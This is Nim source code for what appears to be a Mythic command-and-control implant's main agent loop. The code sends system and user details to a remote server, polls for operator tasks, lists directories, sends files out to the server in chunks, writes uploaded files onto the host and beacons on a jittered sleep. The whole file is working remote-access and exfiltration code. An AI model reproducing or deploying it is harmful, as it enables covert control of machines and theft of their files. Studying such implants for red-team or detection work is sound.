import std/[json, random, os, base64, tables]
import config
import profiles/http_profile
import utils/sysinfo
import tasks/exit
import tasks/sleep
import tasks/ls
import tasks/download
import tasks/upload

type
  BackgroundTaskType = enum
    btDownload, btUpload
  
  BackgroundTaskState = object
    taskType: BackgroundTaskType
    path: string
    fileId: string
    totalChunks: int
    currentChunk: int
  
  Agent* = ref object
    config: Config
    profile: HttpProfile
    callbackUuid: string
    shouldExit*: bool
    sleepInterval: int
    jitter: int
    taskResponses: seq[JsonNode]
    backgroundTasks: Table[string, BackgroundTaskState]  # taskId -> state

proc newAgent*(): Agent =
  ## Create a new agent instance
  result = Agent()
  result.config = getConfig()
  result.profile = newHttpProfile()
  result.callbackUuid = result.config.uuid  # Initialize with payload UUID
  result.shouldExit = false
  result.sleepInterval = result.config.callbackInterval
  result.jitter = result.config.callbackJitter
  result.taskResponses = @[]
  result.backgroundTasks = initTable[string, BackgroundTaskState]()
  
  # If AESPSK is configured, parse and set it immediately (before checkin)
  if result.config.aesKey.len > 0:
    try:
      # AESPSK is a JSON string like: {"dec_key": "...", "enc_key": "...", "value": "aes256_hmac"}
      let aespskJson = parseJson(result.config.aesKey)
      let encKeyB64 = aespskJson["enc_key"].getStr()
      let decoded = decode(encKeyB64)
      let keyBytes = cast[seq[byte]](decoded)
      result.profile.setAesKey(keyBytes)
      if result.config.debug:
        echo "[DEBUG] AESPSK detected - using pre-shared AES key (no RSA exchange)"
    except:
      if result.config.debug:
        echo "[DEBUG] Failed to parse AESPSK: ", getCurrentExceptionMsg()

proc buildCheckinMessage(): JsonNode =
  ## Build the initial checkin message
  let sysInfo = getSystemInfo()
  let cfg = getConfig()
  
  result = %*{
    "action": "checkin",
    "uuid": cfg.uuid,
    "ips": sysInfo.ips,
    "os": sysInfo.os,
    "user": sysInfo.user,
    "host": sysInfo.hostname,
    "pid": sysInfo.pid,
    "architecture": sysInfo.arch,
    "domain": sysInfo.domain,
    "integrity_level": sysInfo.integrityLevel,
    "external_ip": ""
  }
  
  # NOTE: For HTTP profile, we do NOT include encryption_key/decryption_key in checkin
  # Encryption config comes from the C2 profile settings in Mythic
  # These fields are only used during RSA key exchange (staging_rsa action)

proc checkin*(agent: Agent): bool =
  ## Perform initial checkin with Mythic
  if agent.config.debug:
    echo "[DEBUG] Starting checkin..."
  
  # Perform key exchange if enabled AND no AES key is set yet (no AESPSK)
  if agent.config.encryptedExchange and not agent.profile.hasAesKey():
    if not agent.profile.performKeyExchange():
      if agent.config.debug:
        echo "[DEBUG] Key exchange failed"
      return false
  
  # Build and send checkin
  let checkinMsg = buildCheckinMessage()
  let checkinStr = $checkinMsg
  
  if agent.config.debug:
    echo "[DEBUG] Checkin message: ", checkinStr
  
  let response = agent.profile.send(checkinStr, agent.callbackUuid)
  
  if response.len == 0:
    if agent.config.debug:
      echo "[DEBUG] Checkin failed - empty response"
    return false
  
  try:
    let respJson = parseJson(response)
    if respJson.hasKey("status") and respJson["status"].getStr() == "success":
      # Update callback UUID from server response
      let newCallbackUuid = respJson["id"].getStr()
      if agent.config.debug:
        echo "[DEBUG] Checkin successful, updating callback UUID from ", agent.callbackUuid, " to ", newCallbackUuid
      agent.callbackUuid = newCallbackUuid
      return true
  except:
    if agent.config.debug:
      echo "[DEBUG] Failed to parse checkin response: ", getCurrentExceptionMsg()
  
  return false

proc getTasks*(agent: Agent): seq[JsonNode] =
  ## Get tasking from Mythic
  let getTaskingMsg = %*{
    "action": "get_tasking",
    "tasking_size": 1
  }
  
  let response = agent.profile.send($getTaskingMsg, agent.callbackUuid)
  
  if response.len == 0:
    return @[]
  
  try:
    let respJson = parseJson(response)
    if respJson.hasKey("tasks"):
      result = respJson["tasks"].getElems()
      if agent.config.debug:
        echo "[DEBUG] Received ", result.len, " task(s)"
  except:
    if agent.config.debug:
      echo "[DEBUG] Failed to parse tasking: ", getCurrentExceptionMsg()
    result = @[]



proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
  ## Process received tasks
  for task in tasks:
    let taskId = task["id"].getStr()
    let command = task["command"].getStr()
    
    # Check if this is a background task response (download/upload continuation)
    # These are forwarded to background threads in postResponses(), so skip here
    if command == "background_task":
      if agent.config.debug:
        echo "[DEBUG] Background task message (will be forwarded in postResponses): ", taskId
      continue
    
    # Parse parameters - Mythic sends it as a JSON string
    var params = newJObject()
    if task.hasKey("parameters"):
      let paramStr = task["parameters"].getStr()
      if paramStr.len > 0:
        try:
          params = parseJson(paramStr)
        except:
          if agent.config.debug:
            echo "[DEBUG] Failed to parse parameters: ", paramStr
    
    if agent.config.debug:
      echo "[DEBUG] === PROCESSING TASK ==="
      echo "[DEBUG] Task ID: ", taskId
      echo "[DEBUG] Command: ", command
      if params.len > 0:
        echo "[DEBUG] Parameters: ", params.pretty()
      else:
        echo "[DEBUG] No parameters"
    
    # Execute command and get response
    var response = %*{
      "task_id": taskId,
      "user_output": "Command '" & command & "' not yet implemented",
      "completed": true,
      "status": "error"
    }
    
    try:
      case command
      of "exit":
        if agent.config.debug:
          echo "[DEBUG] Executing exit command"
        response = executeExit(params)
        response["task_id"] = %taskId
        agent.shouldExit = true
        
      of "sleep":
        if agent.config.debug:
          echo "[DEBUG] Executing sleep command"
        response = executeSleep(params, agent.sleepInterval, agent.jitter)
        response["task_id"] = %taskId
        
      of "ls":
        if agent.config.debug:
          echo "[DEBUG] Executing ls command"
        let lsResult = executeLs(params)
        # ls returns file browser format, need to wrap for task response
        if lsResult.hasKey("files"):
          # This is a successful file browser response
          # Mythic expects it in "file_browser" field
          response = %*{
            "task_id": taskId,
            "completed": true,
            "status": "completed",
            "file_browser": lsResult,
            "user_output": $lsResult  # Also include as serialized JSON string
          }
          if agent.config.debug:
            echo "[DEBUG] Ls found ", lsResult["files"].len, " files"
        else:
          # This is an error response, already has user_output
          response = lsResult
          response["task_id"] = %taskId
          if agent.config.debug:
            echo "[DEBUG] Ls returned error: ", lsResult.getOrDefault("user_output")
      
      of "download":
        if agent.config.debug:
          echo "[DEBUG] Starting download"
        response = executeDownload(taskId, params)
        agent.taskResponses.add(response)
        
        # Track as background task for chunk handling
        var state = BackgroundTaskState(
          taskType: btDownload,
          path: params["path"].getStr(),
          fileId: "",  # Will be set when we receive it from Mythic
          totalChunks: response["download"]["total_chunks"].getInt(),
          currentChunk: 0
        )
        agent.backgroundTasks[taskId] = state
        continue
      
      of "upload":
        if agent.config.debug:
          echo "[DEBUG] Starting upload"
        response = executeUpload(taskId, params)
        agent.taskResponses.add(response)
        
        # Track as background task for chunk handling
        var state = BackgroundTaskState(
          taskType: btUpload,
          path: params["remote_path"].getStr(),
          fileId: params["file"].getStr(),
          totalChunks: 0,  # Will be set when we receive first chunk
          currentChunk: 1
        )
        agent.backgroundTasks[taskId] = state
        continue
      
      else:
        # Command not implemented
        if agent.config.debug:
          echo "[DEBUG] Command not implemented: ", command
    
    except Exception as e:
      if agent.config.debug:
        echo "[DEBUG] Task execution error: ", e.msg
      response = %*{
        "task_id": taskId,
        "user_output": "Error executing command: " & e.msg,
        "completed": true,
        "status": "error"
      }
    
    if agent.config.debug:
      if response.hasKey("status"):
        echo "[DEBUG] Task result status: ", response["status"].getStr()
      if response.hasKey("user_output"):
        let output = response["user_output"].getStr()
        echo "[DEBUG] Task output length: ", output.len, " bytes"
    
    agent.taskResponses.add(response)

proc postResponses*(agent: var Agent) =
  ## Post task responses back to Mythic
  if agent.taskResponses.len == 0:
    return
  
  if agent.config.debug:
    echo "[DEBUG] === POSTING RESPONSES ==="
    echo "[DEBUG] Posting ", agent.taskResponses.len, " response(s)"
  
  let postMsg = %*{
    "action": "post_response",
    "responses": agent.taskResponses
  }
  
  let response = agent.profile.send($postMsg, agent.callbackUuid)
  
  if agent.config.debug:
    echo "[DEBUG] Responses posted successfully"
  
  agent.taskResponses = @[]
  
  # Handle background task responses (file_id, chunks, etc.)
  if response.len > 0:
    try:
      let respJson = parseJson(response)
      if respJson.hasKey("responses"):
        for taskResp in respJson["responses"]:
          let taskId = taskResp["task_id"].getStr()
          
          # Check if this response is for a background task
          if agent.backgroundTasks.hasKey(taskId):
            var state = agent.backgroundTasks[taskId]
            
            case state.taskType
            of btDownload:
              # Got file_id, now send chunks
              if state.fileId.len == 0 and taskResp.hasKey("file_id"):
                state.fileId = taskResp["file_id"].getStr()
                agent.backgroundTasks[taskId] = state
                if agent.config.debug:
                  echo "[DEBUG] Download got file_id: ", state.fileId
              
              # Send next chunk
              if state.currentChunk < state.totalChunks:
                state.currentChunk += 1
                let chunkResp = processDownloadChunk(taskId, state.fileId, state.path, state.currentChunk)
                agent.taskResponses.add(chunkResp)
                
                # Check if this was the last chunk
                if state.currentChunk >= state.totalChunks:
                  let completeMsg = completeDownload(taskId, state.fileId, state.path)
                  agent.taskResponses.add(completeMsg)
                  agent.backgroundTasks.del(taskId)
                  if agent.config.debug:
                    echo "[DEBUG] Download complete"
                else:
                  agent.backgroundTasks[taskId] = state
                
                # Post immediately to send chunks
                agent.postResponses()
            
            of btUpload:
              # Process incoming chunks
              if taskResp.hasKey("chunk_data"):
                let chunkData = taskResp["chunk_data"].getStr()
                let totalChunks = taskResp["total_chunks"].getInt()
                state.totalChunks = totalChunks
                
                let isFirstChunk = (state.currentChunk == 1)
                let uploadResp = processUploadChunk(taskId, state.fileId, state.path, 
                                                     state.currentChunk, chunkData, totalChunks, isFirstChunk)
                agent.taskResponses.add(uploadResp)
                
                if uploadResp.hasKey("completed") and uploadResp["completed"].getBool():
                  agent.backgroundTasks.del(taskId)
                  if agent.config.debug:
                    echo "[DEBUG] Upload complete"
                else:
                  state.currentChunk += 1
                  agent.backgroundTasks[taskId] = state
                
                # Post immediately  
                agent.postResponses()
    except:
      if agent.config.debug:
        echo "[DEBUG] Failed to parse post_response reply: ", getCurrentExceptionMsg()

proc calculateSleepTime(baseInterval: int, jitterPercent: int): int =
  ## Calculate sleep time with jitter
  ## Works in milliseconds to preserve precision
  if jitterPercent == 0:
    return baseInterval
  
  # Work in milliseconds to avoid integer division precision loss
  let baseMs = baseInterval * 1000
  let jitterMs = rand(-baseMs * jitterPercent .. baseMs * jitterPercent) div 100
  let resultMs = baseMs + jitterMs
  
  # Convert back to seconds
  result = resultMs div 1000
  if result < 1:
    result = 1

proc sleep*(agent: Agent) =
  ## Sleep with jitter
  let sleepTime = calculateSleepTime(agent.sleepInterval, agent.jitter)
  
  if agent.config.debug:
    echo "[DEBUG] Sleeping for ", sleepTime, " seconds (base: ", agent.sleepInterval, 
         "s, jitter: ", agent.jitter, "%)"
  
  os.sleep(sleepTime * 1000)


